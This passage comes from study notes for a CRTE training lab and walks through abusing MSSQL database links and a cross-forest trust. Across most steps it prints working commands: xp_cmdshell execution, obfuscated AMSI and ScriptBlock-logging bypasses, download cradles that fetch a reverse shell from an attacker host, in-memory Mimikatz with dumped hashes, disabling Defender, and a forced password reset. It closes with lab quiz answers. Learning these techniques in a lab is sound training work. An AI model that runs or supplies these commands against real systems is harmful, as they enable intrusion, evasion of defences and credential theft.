![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/fb735b9b-64fe-4e58-a05f-523e5f11a5d8)



5. We can also use Get-SQLServerLinkCrawl from PowerUpSQL for crawling the database links automatically
```powershell
PS> Get-SQLServerLinkCrawl -Instance us-mssql.us.techcorp.local -Verbose
```




6. So, we do have database links to other SQL Servers. If xp_cmdshell is enabled (or rpcout is true that allows us to enable xp_cmdshell), it is possible to execute commands on any node in the database links using the below commands
```powershell
PS> Get-SQLServerLinkCrawl -Instance us-mssql.us.techcorp.local -Query "exec master..xp_cmdshell 'whoami'" | ft
PS> Get-SQLServerLinkCrawl -Instance us-mssql.us.techcorp.local -Query "exec master..xp_cmdshell 'hostname'" | ft
```



> Looks like we can run operating system commands on DB-SQLPROD instance.

7. Let’s try to execute a PowerShell reverse shell. We must first start a listener from InvisiShell
```powershell
PS> . .\powercat.ps1
PS> powercat -l -v -p 443 -t 1000
```

8. Now, use the PowerShell download execute cradle to run the reverse shell on DB-SQLPROD. Note that in the below command, we first run an ScriptBlock logging bypass, then an AMSI bypass and finally, the reverse shell. Remember to host all of them on a local web server
```powershell
# cat sbloggingbypass.txt
# [Reflection.Assembly]::"l`o`AdwIThPa`Rti`AlnamE"(('S'+'ystem'+'.C'+'ore'))."g`E`TTYPE"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der'))."gET`FI`eLd"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance'))."seTVa`l`Ue"([Ref]."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'tw'+'Provid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static'))."gE`Tva`lUe"($null),0)

# cat amsibypass.txt
# S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

# add the following line at the end of Invoke-TCP
# reverse -Reverse -IPAddress 192.168.100.131 -Port 443

PS> Get-SQLServerLinkCrawl -Instance us-mssql.us.techcorp.local -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://192.168.100.131/sbloggingbypass.ps1);iex (iwr -UseBasicParsing http://192.168.100.131/amsibypass.ps1);iex (iwr -UseBasicParsing http://192.168.100.131/Invoke-PowerShellTcpEx.ps1)"'''
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/d17a0162-5c8c-4abc-b0a2-49911383dcc8)

9. Because the link from DB-SQLProd to DB-SQLSrv is configured to use sa. We can enable RPC Out and xp_cmdshell on DB-SQLSrv! Run the below commands on the reverse shell we got above. Ignore the scary looking message after the first command:
```powershell
# How to enable rpcout in a linked DB
# first get a rev shell on the parent DB
PS> Invoke-SqlCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc', @optvalue='TRUE'"
PS> Invoke-SqlCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc out', @optvalue='TRUE'"
# not required but can do
# PS> Invoke-SqlCmd -Query "EXECUTE ('sp_configure ''show advanced options'',1;reconfigure;') AT ""db-sqlsrv"""
PS> Invoke-SqlCmd -Query "EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT ""db-sqlsrv"""
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/75ae6bbb-f3e2-4c2f-8a0e-eac089d61884)


10. Let's try to execute commands on all the link nodes again and check if it works on db-sqlsrv too:
```powershell
# it works !! :D
PS> Get-SQLServerLinkCrawl -Instance us-mssql.us.techcorp.local -Query "exec master..xp_cmdshell 'whoami'" | ft
PS> Get-SQLServerLinkCrawl -Instance us-mssql.us.techcorp.local -Query "exec master..xp_cmdshell 'hostname'" | ft
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/582a86a2-dfa5-4a40-bf8d-799903dfbb03)


11. Now, to execute commands only on a particular node (DB-SQLSRV), use the below command in
```powershell
# setup powercat
PS> . .\powercat.ps1
PS> powercat -l -v -p 443 -t 1000

# add the following line at the end of Invoke-TCP
# reverse -Reverse -IPAddress 192.168.100.131 -Port 8080

PS> Get-SQLServerLinkCrawl -Instance us-mssql.us.techcorp.local -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://192.168.100.131/sbloggingbypass.ps1);iex (iwr -UseBasicParsing http://192.168.100.131/amsibypass.ps1);iex (iwr -UseBasicParsing http://192.168.100.131/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget db-sqlsrv
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/b095ceba-7ba0-4d27-bd8c-6494b4fe28fa)


## **Dumping Credentials**
<hr>

+ Download and execute mimikatz in memory on *DB-SQLSRV*
```powershell
# transfer mimi.ps1 and execute
PS> iex (New-Object Net.WebClient).DownloadString('http://192.168.100.131/Invoke-Mimi.ps1')

# dump creds
PS> Invoke-Mimi -Command '"sekurlsa::ekeys"'

# Username :: DB-SQLSRV$
# Domain   :: db.local
# Password :: 'j8Q@-[<^$W[Gg7$& WV9 ]fa&lo(Yx&[ojgu#HC%\q,wLc5I!s7z?X'(gSKQ1WZ;W,&h?D,oT!toa6heXw5bO0(o+:>IO*f8^e*wue'RUeC^ky/SRiY\NRn
# ntlm :: 02e9eb2a4a8d05f3a66f70629e2f8d8e 
# aes256 :: af7f6544bd0843bb6a4f745e169d8dce90bf8ba941e2a289c50ba2061c6d8f7b 

# UserName :: srvdba
# Domain   :: DB.LOCAL
# Logon Server :: DB-DC
# ntlm :: 4f156d02e984989bbdd48de819bc4994 
# aes256 :: 88244f436f34606900ea61c36331963f31fc15f6e3200c4bbda708256886c8e4 
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/1cd315ec-6981-4010-9f6c-49950de0fbc3)

<img src="./assets/1.png" />

+ Download and execute mimikatz in memory on *DB-SQLProd*
```powershell
# transfer mimi.ps1 and execute
PS> iex (New-Object Net.WebClient).DownloadString('http://192.168.100.131/Invoke-Mimi.ps1')

# dump creds
PS> Invoke-Mimi -Command '"sekurlsa::ekeys"'

# can not do >> :(
```

<img src="./assets/2.png" />

<h1 style='color:lightblue'> 19 - DB.LOCAL </h1>

## **Cross Forest Attack**
<hr>

1. Run the following commands on the reverse shell. We are bypassing AMSI first and then using a download-execute cradle to load PowerView
```powershell
# bypass amsi
PS> S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

# download powerview
PS> iex (New-Object Net.WebClient).DownloadString('http://192.168.100.131/PowerView.ps1')

# forest enum
PS> Get-ForestTrust
```

<img src="./assets/3.png" />

2. Enumerate interesting ACLs in the dbvendor.local domain
```powershell
PS> Find-InterestingDomainAcl -ResolveGUIDs -Domain dbvendor.local
# sid :: S-1-5-21-2781415573-3701854478-2406986946-1105 
```

<img src="./assets/4.png" />

3. So, srvdba has GenericAll over db131svc users in dbvendor.local domain. We can do many things with GenericAll on a user object like Reset Password, Set SPN on user etc. Reset password of db131svc user that matches your student user ID
```powershell
PS> Set-DomainUserPassword -Identity db131svc -AccountPassword (ConvertTo-SecureString 'Password@123' -AsPlainText -Force) -Domain dbvendor.local -Verbose
```

4. We just got access to the db131svc user in dbvendor.local. Now, let's enumerate FSPs for db.local. Run the below commands on the reverse shell
```powershell
PS> Find-ForeignGroup –Verbose
```

<img src="./assets/5.png" />

5. And no surprise, the FSPs who are part of the built-in Administrators group are the dbxsvc users
```powershell
PS> Get-DomainUser -Domain dbvendor.local | ?{$_.ObjectSid -eq 'S-1-5-21-569087967-1859921580-1949641513-13601'}
```

<img src="./assets/6.png" />

6. This means, we can escalate privileges in db.local by using credentials of db131svc. We can use winrs or PowerShell Remoting cmdlets
```powershell
# WINRS
PS> winrs -r:db-dc.db.local -u:dbvendor\db131svc -p:Password@123 "whoami"

# or PSR
PS C:\Windows\system32> $passwd = ConvertTo-SecureString 'Password@123' -AsPlainText -Force
PS C:\Windows\system32> $creds = New-Object System.Management.Automation.PSCredential ("dbvendor\db131svc", $passwd)
PS C:\Windows\system32> $dbdc = New-PSSession -Computername db-dc.db.local -Credential $creds
PS> Invoke-Command -scriptblock{whoami;hostname} -Session $dbdc
```

<img src="./assets/7.png" />

7. Lets dump the creds on this system
```powershell
PS> iex (New-Object Net.WebClient).DownloadString('http://192.168.100.131/Invoke-Mimi.ps1')
PS> Invoke-Command -scriptblock{whoami;hostname} -Session $dbdc
PS> Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $dbdc
PS> Invoke-command -ScriptBlock ${function:Invoke-Mimi} -Session $dbdc
```

#### 51. Database privileges that we have on db-sqlsrv due to database links
```powershell
PS> # sa
```

#### 52. Name of the Windows user that is used to run SQL Server service on db-sqlsrv
```powershell
PS> # srvdba
```

#### 53. What are the permissions that srvdba has on dbxsvc users?
```powershell
PS> # GenericAll
```

#### 54. Foreign Security Principals are a member of which group in db.local?
```powershell
PS> # administrators
```
